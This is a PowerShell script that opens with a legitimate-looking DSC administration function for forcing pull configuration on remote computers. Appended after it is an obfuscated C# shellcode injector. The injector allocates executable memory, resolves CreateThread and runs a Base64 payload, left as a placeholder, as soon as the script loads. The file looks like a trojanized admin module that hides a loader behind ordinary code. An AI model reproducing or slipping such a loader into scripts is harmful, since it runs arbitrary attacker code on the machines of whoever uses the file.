
function Start-CDscPullConfiguration
{
    
    [CmdletBinding(DefaultParameterSetName='WithCredentials')]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='WithCredentials')]
        [string[]]
        
        $ComputerName,

        [Parameter(ParameterSetName='WithCredentials')]
        [PSCredential]
        
        $Credential,

        [Parameter(ParameterSetName='WithCimSession')]
        [Microsoft.Management.Infrastructure.CimSession[]]
        $CimSession,

        [string[]]
        
        $ModuleName
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $credentialParam = @{ }
    if( $PSCmdlet.ParameterSetName -eq 'WithCredentials' )
    {
        if( $Credential )
        {
            $credentialParam.Credential = $Credential
        }

        $CimSession = New-CimSession -ComputerName $ComputerName @credentialParam
        if( -not $CimSession )
        {
            return
        }
    }

    $CimSession = Get-DscLocalConfigurationManager -CimSession $CimSession |
                    ForEach-Object {
                        if( $_.RefreshMode -ne 'Pull' )
                        {
                            Write-Error ('The Local Configuration Manager on ''{0}'' is not in Pull mode (current RefreshMode is ''{1}'').' -f $_.PSComputerName,$_.RefreshMode)
                            return
                        }

                        foreach( $session in $CimSession )
                        {
                            if( $session.ComputerName -eq $_.PSComputerName )
                            {
                                return $session
                            }
                        }
                    }

    if( -not $CimSession )
    {
        return
    }

    
    Invoke-Command -ComputerName $CimSession.ComputerName @credentialParam -ScriptBlock {
        $modulesRoot = Join-Path -Path $env:ProgramFiles -ChildPath 'WindowsPowerShell\Modules'
        Get-ChildItem -Path $modulesRoot -Filter '*_tmp' -Directory | 
            Remove-Item -Recurse
    }

    if( $ModuleName )
    {
        
        Invoke-Command -ComputerName $CimSession.ComputerName @credentialParam -ScriptBlock {
            param(
                [string[]]
                $ModuleName
            )

            $dscProcessID = Get-WmiObject msft_providers | 
                                Where-Object {$_.provider -like 'dsccore'} | 
                                Select-Object -ExpandProperty HostProcessIdentifier 
            Stop-Process -Id $dscProcessID -Force

            $modulesRoot = Join-Path -Path $env:ProgramFiles -ChildPath 'WindowsPowerShell\Modules'
            Get-ChildItem -Path $modulesRoot -Directory |
                Where-Object { $ModuleName -contains $_.Name } |
                Remove-Item -Recurse

        } -ArgumentList (,$ModuleName)
    }

    
    $win32OS = Get-CimInstance -CimSession $CimSession -ClassName 'Win32_OperatingSystem'

    $results = Invoke-CimMethod -CimSession $CimSession `
                                -Namespace 'root/microsoft/windows/desiredstateconfiguration' `
                                -Class 'MSFT_DscLocalConfigurationManager' `
                                -MethodName 'PerformRequiredConfigurationChecks' `
                                -Arguments @{ 'Flags' = [uint32]1 } 

    $successfulComputers = $results | Where-Object { $_ -and $_.ReturnValue -eq 0 } | Select-Object -ExpandProperty 'PSComputerName'

    $CimSession | 
        Where-Object { $successfulComputers -notcontains $_.ComputerName } |
        ForEach-Object { 
            $session = $_
            $startedAt= $win32OS | Where-Object { $_.PSComputerName -eq $session.ComputerName } | Select-Object -ExpandProperty 'LocalDateTime'
            Get-CDscError -ComputerName $session.ComputerName -StartTime $startedAt -Wait 
        } | 
        Write-CDscError
}

$Injector = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace Injector
{
    public class Shellcode
    {
		private static UInt32 VAR1 = 0x1000;
		private static UInt32 VAR2 = 0x40;
		
		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 VAR3, UInt32 VAR4, UInt32 VAR5, UInt32 VAR6);
		
		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject(IntPtr VAR3, UInt32 VAR4);
		
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate IntPtr VAR10(IntPtr VAR3, UInt32 VAR4, IntPtr VAR5, IntPtr VAR6, UInt32 VAR7, UInt32 VAR8);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string VAR3);
		
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(IntPtr VAR3, string VAR4);
	

        static public void Exec(byte[] cmd)
        {
			IntPtr VAR11 = LoadLibrary("kernel32.dll");
			IntPtr VAR12 = GetProcAddress(VAR11, "CreateThread");
			VAR10 VAR13 = (VAR10)Marshal.GetDelegateForFunctionPointer(VAR12, typeof(VAR10));
			UInt32 VAR14 = VirtualAlloc(0, (UInt32)cmd.Length, VAR1, VAR2);
			Marshal.Copy(cmd, 0, (IntPtr)(VAR14), cmd.Length);
			IntPtr VAR15 = IntPtr.Zero;
			IntPtr VAR16 = IntPtr.Zero;
			VAR15 = VAR13(IntPtr.Zero, 0, (IntPtr)VAR14, VAR16, 0, 0);
			WaitForSingleObject(VAR15, 0xFFFFFFFF);
		}
    }
}
"@

Try {
    Add-Type -TypeDefinition $Injector -Language CSharp
} Catch {
    Write-Output "CSharp already loaded"
}
[Injector.Shellcode]::Exec([Convert]::FromBase64String("[PAYLOAD]"));
